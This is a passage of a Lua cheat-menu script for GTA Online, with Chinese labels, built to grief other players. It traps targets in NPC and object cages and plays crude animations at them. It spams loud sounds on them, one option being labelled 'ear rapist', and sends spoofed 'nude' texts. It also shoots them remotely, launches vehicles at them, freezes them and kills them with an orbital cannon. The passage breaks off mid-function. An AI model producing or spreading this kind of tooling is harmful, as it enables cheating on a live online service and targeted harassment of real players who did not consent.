if GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_FUCK_YOU') ==true
then Fuckyou(peds)

elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Provoke_Trespass')
then Provoke(peds)

elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Generic_Insult_High')
then Insulthigh(peds)

elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_WAR_CRY')
then Warcry(peds)
else
end
end

      -----------Anim-------------------------
    Streamanim('rcmpaparazzo_2')
    Streamanim('mp_player_int_upperfinger')
    Streamanim('misscarsteal2peeing')
    Streamanim('mp_player_int_upperpeace_sign')
    local ped_anim = {peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8]}
    for _, Pedanim in ipairs(ped_anim) do
        if pedhash == util.joaat('player_two') then
            Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
           local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
            Streamptfx('core')
           GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false)
        elseif pedhash == util.joaat('u_m_m_jesus_01') then
            Runanim(peds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
            Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
        else
            Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
            Runanim(peds[1], 'rcmpaparazzo_2', 'shag_loop_a')
        end

end


for _, Pedm in ipairs(peds) do
    PFP(Pedm, targets)
end
cage_table[pid] = peds
end

while cage_table[pid] do
IPM(targets, tar1, pname, cage_table, pid)
end

if not players.exists(pid) then
    if set.alert then
        util.toast('你让他们怒不可遏')
    end
    util.stop_thread()

    cage_table[pid] = nil
    end
end)

local PedClist = menu.list(lz, '选择Ped笼子', {}, '如果他们移动或删除当前Ped,请更改Ped样式')

menu.action(lz, '解除Ped笼', {'FreePedcage'}, '将玩家从Ped笼子中释放', function ()
    if cage_table[pid] then
        DelEnt(cage_table[pid])
        menu.set_value(pedca, false)
        cage_table[pid] = false
        else
             if set.alert then
                util.toast('未找到Ped笼子')
             end
    end
end)

pcages = {}
rcage_table = {}
CombineTables(AMC, AfC, CSP, GM, Mpp, MSF, MCM, SMC, Ssf, Ssm, Dlcp, pcages)
local rpedca =  menu.toggle_loop(lz, '随机Ped笼', {'RAMDOMPCAGE'}, '将玩家困在一个随机的Ped笼子里', function ()
  local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
  local pname = PLAYER.GET_PLAYER_NAME(pid)
  if not rcage_table[pid] then
      local rpeds = {}
      local rpedind = math.random(1, #pcages)
      local rpedset = pcages[rpedind]
      local pedhash = util.joaat(rpedset)
      local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
      Delcar(targets, spec, pid)

      local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
    for _, spawned_ped in ipairs(ped_tab) do
        spawned_ped = Pedspawn(pedhash, tar1)
        table.insert(rpeds,  spawned_ped)
    end


    SetPedCoor(rpeds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(rpeds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(rpeds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

  ---------Audio--------------
  if pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(rpeds[1], rpeds[2], rpeds[3], rpeds[4], rpeds[5], rpeds[6], rpeds[7], rpeds[8])
  elseif pedhash == util.joaat('player_two') then
      Trevortime(rpeds)
  elseif pedhash == util.joaat('u_m_m_jesus_01') then
      Jesuslovesyou(rpeds)  
  elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
  if GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'GENERIC_FUCK_YOU') ==true
  then Fuckyou(rpeds)

  elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'Provoke_Trespass')
  then Provoke(rpeds)

  elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'Generic_Insult_High')
  then Insulthigh(rpeds)

  elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'GENERIC_WAR_CRY')
  then Warcry(rpeds)
  else
  end
  end

        -----------Anim-------------------------
      Streamanim('rcmpaparazzo_2')
      Streamanim('mp_player_int_upperfinger')
      Streamanim('misscarsteal2peeing')
      Streamanim('mp_player_int_upperpeace_sign')
      local ped_anim = {rpeds[2], rpeds[3], rpeds[4], rpeds[5], rpeds[6], rpeds[7], rpeds[8]}
      for _, Pedanim in ipairs(ped_anim) do
          if pedhash == util.joaat('player_two') then
              Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
             local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
              Streamptfx('core')
             --credits to saltyscript for gfx part
             GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false)
          elseif pedhash == util.joaat('u_m_m_jesus_01') then
              Runanim(rpeds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
              Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
          else
              Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
              Runanim(rpeds[1], 'rcmpaparazzo_2', 'shag_loop_a')
          end

  end


  for _, Pedm in ipairs(rpeds) do
      PFP(Pedm, targets)
  end

  rcage_table[pid] = rpeds
  end

 while rcage_table[pid] do
  IPM(targets, tar1, pname, rcage_table, pid)
 end

  if not players.exists(pid) then

    if set.alert then
        util.toast('你让他们怒不可遏')
    end
    util.stop_thread()

    rcage_table[pid] = nil
    end
end)

menu.action(lz, '解除随机Ped笼', {'FreeRPedcage'}, '从随机Ped笼子中释放玩家', function ()
      if rcage_table[pid] then
          DelEnt(rcage_table[pid])
          menu.set_value(rpedca, false)
          rcage_table[pid] = false
          else
               if set.alert then
                  util.toast('未找到Ped笼子')
               end
      end
  end)

  obj_table = {}
  local objset = {mdl = 'prop_mineshaft_door'}
  local objca = menu.toggle_loop(lz, '物体笼子', {'ObjCage'}, '将玩家困在物体笼子里', function ()
  local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
  local pname = PLAYER.GET_PLAYER_NAME(pid)

  if not obj_table[pid] then
      local objs = {}

      local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
      Delcar(targets, spec, pid)
      
local hsel = util.joaat(objset.mdl)
      Streament(hsel)
      local obj_tab = {'o1', 'o2', 'o3', 'o4', 'o5', 'o6', 'o7', 'o8'}
      for _, spawned_obj in ipairs(obj_tab) do
          spawned_obj =  ObjFrezSpawn(hsel, tar1)
          table.insert(objs,  spawned_obj)
      end
      obj_table[pid] = objs

      SetObjCo(objs[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
      SetObjCo(objs[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
      SetObjCo(objs[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
      SetObjCo(objs[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
      SetObjCo(objs[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

      ENTITY.SET_ENTITY_ROTATION(objs[1], 0, 0, 180, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[2], 0, 0, 135, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[3], 0, 0, 90, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[4], 0, 0, 45, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[6], 0, 0, 315, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[7], 0, 0, 270, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[8], 0, 0, 225, 1, true)

      

      for _, horn in ipairs(objs) do
          AUDIO.PLAY_SOUND_FROM_ENTITY(-1, 'Alarm_Interior', horn, 'DLC_H3_FM_FIB_Raid_Sounds', 0, 0)
      end

  end
while obj_table[pid] do
  IPM(targets, tar1, pname, obj_table, pid)
end

if not players.exists(pid) then

  if set.alert then
      util.toast('你让他们怒不可遏')
  end
  util.stop_thread()

  obj_table[pid] = nil
end

end)

local ObjSlist = menu.list(lz, '更改物体笼子样式', {}, '如果他们移动或删除当前物体,请更改物体样式')

menu.action(lz, '解除物体笼子', {'FreeObjcage'}, '将玩家从物体笼子中释放', function ()
  if obj_table[pid] then
      DelEnt(obj_table[pid])
      menu.set_value(objca, false)
      Stopsound()
      obj_table[pid] = false
      else
          if set.alert then
              util.toast('未找到物体笼子')    
          end
  end

end)

menu.list_action(PedClist, '特殊NPC', {''}, '更改Ped样式为自定义NPC', SPClist, function(pedsel)
    pedset.mdl = SPC[pedsel]
end)

menu.list_action(PedClist, '游戏中的女性NPC', {''}, '更改Ped样式为游戏中的女性NPC', AfClist, function(pedsel)
    pedset.mdl = AfC[pedsel]
end)

menu.list_action(PedClist, '游戏中的男性NPC', {''}, '更改Ped样式为游戏中的男性NPC', AMClist, function(pedsel)
    pedset.mdl = AMC[pedsel]
end)

menu.list_action(PedClist, '过场动画NPC', {''}, '更改Ped样式为游戏中的过场动画NPC(非必要不使用)', Csplist, function(pedsel)
    pedset.mdl = CSP[pedsel]
end)

menu.list_action(PedClist, '帮派成员', {''}, '更改Ped样式为游戏中的帮派成员', GMlist, function(pedsel)
    pedset.mdl = GM[pedsel]
end)

menu.list_action(PedClist, '在线模式中的NPC', {''}, '更改Ped样式为在线模式中的NPC', Mpplist, function(pedsel)
    pedset.mdl = Mpp[pedsel]
end)

menu.list_action(PedClist, '在线模式过场动画中的女性NPC', {''}, '更改Ped样式为在线模式过场动画中的女性NPC', MSFlist, function(pedsel)
    pedset.mdl = MSF[pedsel]
end)

menu.list_action(PedClist, '在线模式过场动画中的男性NPC', {''}, '更改Ped样式为在线模式过场动画中的男性NPC', MCMlist, function(pedsel)
    pedset.mdl = MCM[pedsel]
end)

menu.list_action(PedClist, '故事模式角色', {''}, '更改Ped样式为故事模式角色', SMClist, function(pedsel)
    pedset.mdl = SMC[pedsel]
end)

menu.list_action(PedClist, '故事模式过场动画女性NPC', {''}, '更改Ped样式为故事模式过场动画女性NPC', Ssflist, function(pedsel)
    pedset.mdl = Ssf[pedsel]
end)

menu.list_action(PedClist, '故事模式过场动画男性NPC', {''}, '更改Ped样式为故事模式过场动画男性NPC', Ssmlist, function(pedsel)
    pedset.mdl = Ssm[pedsel]
end)

menu.list_action(PedClist, 'DLC中的NPC', {''}, '更改Ped样式为DLC中的NPC', Dlcplist, function(pedsel)
    pedset.mdl = Dlcp[pedsel]
end)

menu.list_action(ObjSlist, '路牌', {''}, '更改物体样式为路牌', Siglist, function(objsel)
    objset.mdl = Sigha[objsel]
end)

menu.list_action(ObjSlist, '门', {''}, '更改物体样式为门', Dolist, function(objsel)
    objset.mdl = Doha[objsel]
end)

menu.list_action(ObjSlist, '室内道具', {''}, '更改物体样式为室内道具', Interlist, function(objsel)
    objset.mdl = Intob[objsel]
end)

menu.list_action(ObjSlist, '外部道具', {''}, '更改物体样式为外部道具', Extlist, function(objsel)
    objset.mdl = Extob[objsel]
end)


menu.action(lz, "笼子", {""}, "", function ()
ptlz(pid)
end)
menu.action(lz, "七度空间", {""}, "", function ()
qdkj(pid)
end)
menu.action(lz, "钱笼子", {""}, "", function ()
zdlz(pid)
end)
menu.action(lz, "垃圾箱", {""}, "", function ()
yylz(pid)
end)
menu.action(lz, "小车车", {""}, "", function ()
cclz(pid)
end)
menu.action(lz, "圣诞快乐", {""}, "", function ()
sdkl1(pid)
end)
menu.action(lz, "圣诞快乐pro", {""}, "", function ()
sdkl2(pid)
end)
menu.action(lz, "圣诞快乐promax", {""}, "", function ()
sdkl3(pid)
end)
menu.action(lz, "电击笼", {""}, "", function ()
powercage(pid)
end)
menu.action(lz, "竞技管", {""}, "", function ()
jjglz(pid)
end)
menu.action(lz, "英国女王笼子", {""}, "", function(cl)
gueencage(pid)
end)

menu.action(lz, "运输集装箱", {"cage123"}, "", function()
chestcage(pid)
end)

menu.action(lz, "载具笼子", {"cage4321"}, "", function()
    vehcagelol(pid)
end)

menu.action(lz, "燃气笼", {"gascage4321"}, "", function()
gascage(pid)
end)

menu.toggle(lz, "新世纪全自动化套笼", {"autocage"}, "自动套笼子", function(on)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
    cage_loop = on
    if cage_loop then
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
            util.yield(300)
            if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
                notification("踢出载具失败", colors.pink)
                menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
                return
            end
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        end
        cage_player(a)
    end
    while cage_loop do
        local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 
        local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
        if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 
            a = b
            if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
                goto continue
            end
            cage_player(a)
            notification(PLAYER.GET_PLAYER_NAME(pid).."跑出来了，再次套住", colors.pink)
            ::continue::
        end
        util.yield(1000)
    end
end)

menu.action(lz, "删除笼子", {""}, "只能删除简单的笼子", function()
            for key, value in pairs(cages) do
                entities.delete_by_handle(value)
            end
            local entitycount = 0
            for i, object in ipairs(spawned_objects) do
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
                entities.delete_by_handle(object)
                spawned_objects[i] = nil
                entitycount += 1
            end
            util.toast("清除笼子完成")
    end)
	
local ptfxmenu = menu.list(playerMain, '粒子效果轰炸', {}, '')

menu.toggle_loop(ptfxmenu, '粒子效果轰炸', {}, '发送您选择的粒子效果', function ()
    ftpxspam(pid)
end)

menu.list_action(ptfxmenu, '类型', {''}, '在列表中选择粒子类型', Fxcorelist, function(fxsel)
    ftpxspam_set(fxsel)
end)

local metmenu = menu.list(playerMain, '模型生成', {}, '')

local bigolist = {} 
local bigobjset  = {obj= util.joaat('prop_asteroid_01'), ptfx = false, exp = false, speed = 1000}
menu.toggle_loop(metmenu, '模型生成', {'Oshower'}, '在天空下模型雨', function ()
    
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local oha = bigobjset.obj --credits to lance#8011 for this function
    local r1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS( targets, math.random(-500, 500), math.random(-500, 500), 300.0)
    local r2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS( targets, math.random(-500, 500), math.random(-500, 500), 0)
    local diff = {}
    diff.x = (r2.x - r1.x)*500
    diff.y = (r2.y - r1.y)*500
    diff.z = (r2.z - r1.z)*500
    Streament(oha)
    local bigobj = OBJECT.CREATE_OBJECT(oha, r1.x, r1.y, r1.z, true, true, true)
    ENTITY.SET_ENTITY_HAS_GRAVITY(bigobj, true)
    ENTITY.APPLY_FORCE_TO_ENTITY(bigobj, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
    OBJECT.SET_OBJECT_PHYSICS_PARAMS(bigobj, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
    util.yield(100)

    bigolist[#bigolist + 1] = bigobj
    for _, met in ipairs(bigolist) do
        local mcoor = ENTITY.GET_ENTITY_COORDS(met)
    if ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(bigolist) < 0.5 then
        Streamptfx("scr_xm_orbital")
        if bigobjset.exp then
            FIRE.ADD_EXPLOSION(mcoor.x, mcoor.y, mcoor.z, 8, 100, true, bigobjset.ptfx, 1, false)
            FIRE.ADD_EXPLOSION(mcoor.x, mcoor.y, mcoor.z, 59, 100, true, bigobjset.ptfx, 1, false)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_xm_orbital_blast', mcoor.x, mcoor.y, mcoor.z + 10, 0, 180, 0, 10.0, true, true, true)
        end
    end
end
if #bigolist > 175 then
    DelEnt(bigolist)
    bigolist= {}
end
    util.yield(bigobjset.speed)
    if not players.exists(pid) then
        util.stop_thread()
    end

end)

menu.toggle(metmenu, '天基炮爆炸', {''}, '在下模型雨时开启天基炮爆炸', function (on)
    bigobjset.exp = on
end)

menu.slider(metmenu, '生成延迟', {''}, '调整模型生成延迟', 0, 3000, 1000, 100, function (s)
    bigobjset.speed = s
end)

menu.list_action(metmenu, '模型列表', {''}, '改变模型秀的模型', Bigobjlist, function(objsel)
    bigobjset.obj = util.joaat(Bigobj[objsel])
end)


    local soundtrolls_root = menu.list(playerMain, "声音恶搞", {"soundtrolling"}, "")

    menu.list_action(soundtrolls_root, "语音恶搞", {"voicetrolls"}, "", {"庞森比女士迪丝", "基夫隆", "辱骂"}, function(index, value, click_type)
        local voice
        local speech
        local z_off = 0
        if PED.IS_PED_IN_ANY_VEHICLE(target_ped, false) then 
            z_off = get_model_size(ENTITY.GET_ENTITY_MODEL(PED.GET_VEHICLE_PED_IS_IN(target_ped, false))).z
        end
        pluto_switch index do
            case 1:
                voice = "S_F_M_SHOP_HIGH_WHITE_MINI_01"
                speech = "BUMP"
                break
            case 2:
                voice = "A_F_M_BEACH_01_WHITE_FULL_01"
                speech = "KIFFLOM_GREET"
                break
            case 3: 
                voice = ""
                speech = "GENERIC_INSULT_HIGH_01"
        end
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, -1.0, 0.0+z_off)
        --AUDIO.PLAY_AMBIENT_SPEECH_FROM_POSITION_NATIVE(speech, voice, coords.x, coords.y, coords.z, "SPEECH_PARAMS_FORCE_SHOUTED")
        request_model_load(util.joaat("s_f_m_shop_high"))
        local voice_ped = entities.create_ped(28, util.joaat("s_f_m_shop_high"), coords, 0)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(voice_ped, true, false)
        ENTITY.SET_ENTITY_ALPHA(voice_ped, 0, false)
        ENTITY.FREEZE_ENTITY_POSITION(voice_ped, true)
        ENTITY.SET_ENTITY_INVINCIBLE(voice_ped, true)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(voice_ped, speech, voice, "SPEECH_PARAMS_FORCE", 0)
        util.yield(5000)
        entities.delete_by_handle(voice_ped)
    end)

    menu.toggle_loop(soundtrolls_root, "循环的爆炸声", {}, "吵死他", function()
        local coords = players.get_position(pid)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", coords.x, coords.y, coords.z, "WASTEDSOUNDS", true, 5, false)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "Crash", coords.x, coords.y, coords.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 5, false)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "BASE_JUMP_PASSED", coords.x, coords.y, coords.z, "HUD_AWARDS", true, 5, false)
        util.yield(20)
        util.toast("你真不是个人 :)")
    end)

    menu.toggle_loop(soundtrolls_root, "笑声折磨", {"torment"}, "他们会反复听到笑声。", function()
        laughsound(pid)
    end)

	menu.toggle_loop(soundtrolls_root, "大喇叭", {""}, "", function()
	     local pos = players.get_position(pid)
	     for i = 1, 30 do
	         AUDIO.PLAY_SOUND_FROM_COORD(-1, "Horn", pos.x, pos.y, pos.z, "DLC_Apt_Yacht_Ambient_Soundset", true, 1, false)
	         AUDIO.PLAY_SOUND_FROM_COORD(-1, "DOOR_BUZZ", pos.x, pos.y, pos.z, "MP_PLAYER_APARTMENT", true, 1, false)
	     end
	     util.yield(150)
	end)

	menu.toggle_loop(soundtrolls_root, "小喇叭", {""}, "", function()
	    local pos = players.get_position(pid)
	    AUDIO.PLAY_SOUND_FROM_COORD(-1, "Horn", pos.x, pos.y, pos.z, "DLC_Apt_Yacht_Ambient_Soundset", true, 1, false)
	    util.yield(200)
	end)

    menu.toggle_loop(soundtrolls_root, "耳朵强奸犯", {}, "一次发出很少的声音来强奸他们的耳朵", function()
        local player = PLAYER.GET_PLAYER_PED(pid)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Crash", player, "WASTEDSOUNDS", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BED", player, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BASE_JUMP_PASSED", player, "HUD_AWARDS", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hack_Fail", player, "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Beep_Red", player, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        util.yield(20)
    end)

	menu.toggle_loop(soundtrolls_root, "手机按键（自己听得到）", {"ringtones"}, "st", function()

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)

    end)

    menu.toggle_loop(soundtrolls_root, "浪费了", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BED", PLAYER.GET_PLAYER_PED(pid), "WastedSounds", true, true)
        util.yield(5800)
    end)

    menu.toggle_loop(soundtrolls_root, "游艇喇叭", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Horn", PLAYER.GET_PLAYER_PED(pid), "DLC_Apt_Yacht_Ambient_Soundset", true, true)
        util.yield(900)
    end)

    menu.toggle_loop(soundtrolls_root, "任务成功", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BASE_JUMP_PASSED", PLAYER.GET_PLAYER_PED(pid), "HUD_AWARDS", true, true)
        util.yield(1250)
    end)

    menu.toggle_loop(soundtrolls_root, "越界计时器", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Out_of_Bounds_Explode", PLAYER.GET_PLAYER_PED(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, true)
        util.yield(5000)
    end)

    menu.toggle_loop(soundtrolls_root, "防空系统启动", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(8000)
    end)

    menu.toggle_loop(soundtrolls_root, "防空系统停用", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defenses_Disabled", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(2000)
    end)

    menu.toggle_loop(soundtrolls_root, "破解失败", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hack_Fail", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(1500)
    end)

    menu.toggle_loop(soundtrolls_root, "破解成功", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hack_Success", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(1500)
    end)

    menu.toggle_loop(soundtrolls_root, "掉电", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Power_Down", PLAYER.GET_PLAYER_PED(pid), "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        util.yield(1500)
    end)

    menu.toggle_loop(soundtrolls_root, "哔哔声", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Beep_Green", PLAYER.GET_PLAYER_PED(pid), "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        util.yield(1500)
    end)

	menu.toggle_loop(soundtrolls_root, "超市他", {""}, "st", function()
        stcnm(pid)
    end)
	
	menu.toggle_loop(soundtrolls_root, "手机按键（自己听得到）", {""}, "st", function()
        phonesoundcnm(pid)
    end)	

    local text_trolls_root = menu.list(playerMain, "短信恶搞", {"smstrolls"}, "")

    menu.list_action(text_trolls_root, "文本", {"textp"}, "", {"裸体", "随机文本"}, function(index, value, click_type)
        textspoof(pid)
    end)

    local weapon_trolling = menu.list(playerMain, "武器恶搞", {""}, "选择武器并射击他们无论你在哪里")

	menu.toggle(weapon_trolling, "观看", {}, "", function(toggle)
        spec_player(pid, toggle)
	end)

	menu.toggle_loop(weapon_trolling, "重型狙击枪", {}, "", function()
        heavy_weapon(pid)
	end)

	menu.toggle_loop(weapon_trolling, "烟花", {}, "", function()
        firework_weapon(pid)
	end)

	menu.toggle_loop(weapon_trolling, "原子波", {}, "", function()
        raypisol_weapon(pid)
	end)

	menu.toggle_loop(weapon_trolling, "燃烧弹", {}, "", function()
        fire_weapon(pid)
	end)

	menu.toggle_loop(weapon_trolling, "电磁脉冲发射器", {}, "", function()
        emp_weapon(pid)
	end)

	menu.toggle_loop(weapon_trolling, "电击", {"taze "}, "", function(on)
        taze_weapon(pid, on)
	end)


    local jindianegao = menu.list(playerMain, "经典恶搞", {}, "")
    local jplaym = menu.list(jindianegao, '击飞玩家', {}, '')

    local juglset = {invisjugc = false, jugsel = util.joaat('speedo2') , jugr = 1000}
    local set = {alert = true}
    local jugloop = menu.toggle_loop(jplaym, '开始击飞', {'JuggleC'}, '反复击飞玩家', function ()
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)


        Delcar(targets)
        Streament(juglset.jugsel)

    if not PED.IS_PED_RAGDOLL(targets) then
        JuggleCar(juglset.jugsel, tar1, juglset.invisjugc, juglset.jugr)
        else
            if set.alert then
                util.toast(pname..' 正在被击飞')
            end
    end

    if not players.exists(pid) then
        if set.alert then
            util.toast('你让他们怒不可遏')
        end
        util.stop_thread()
    end

  end)

menu.set_value(jugloop, nil)

menu.toggle(jplaym, '隐形载具', {}, '将攻击载具更改为不可见', function (on)
    juglset.invisjugc = on
end)

local jclist = menu.list(jplaym, '更改用于击飞的载具', {}, '')
menu.list_action(jclist, '载具列表', {''}, '更改用于击飞的载具', Vehlist, function(jugsel)
    juglset.jugsel = util.joaat(Vehha[jugsel])
end)

menu.slider(jplaym, '击飞频率', {'jugglerate'}, '更改载具击飞间隔速度', 100, 4000, 1000, 100, function (jr)
    juglset.jugr = jr
end)

menu.text_input(jclist, '输入自定义载具模型名', {'cusjug'}, '输入车辆模型名以更改载具为攻击载具', function(cusveh)
    if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cusveh)) then
        juglset.jugsel = util.joaat(cusveh)
    else
        if set.alert then
            util.toast('载具名称不正确(请检查你的拼写)')
        end
    end
end, 'toreador')

	local trans = {
		Passive = translate("Trolling", "The player is in passive mode"),
		InInterior = translate("Trolling", "The player is in interior")
	}

	menu.action(jindianegao, translate("Trolling", "用天基炮杀死他"), {"orbital"}, "", function()
		if is_player_in_any_interior(pid) then
			notification:help(trans.InInterior, HudColour.red)
		elseif is_player_passive(pid) then
			notification:help(trans.Passive, HudColour.red)
		elseif not OrbitalCannon.exists() and PLAYER.IS_PLAYER_PLAYING(pid) then
			OrbitalCannon.create(pid)
		end
        while true do
	    OrbitalCannon.mainLoop()
	    util.yield_once()
        end
	end)

    function ped_explosion(pid, model_name, amount)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, false)

    for i = 1, (amount or 10) do
        local hash = util.joaat(model_name or "a_c_shepherd")
        load_model(hash)

        local dog = entities.create_ped(28, hash, coords, math.random(0, 270))

        local size = 20
        local x = math.random(-size, size)
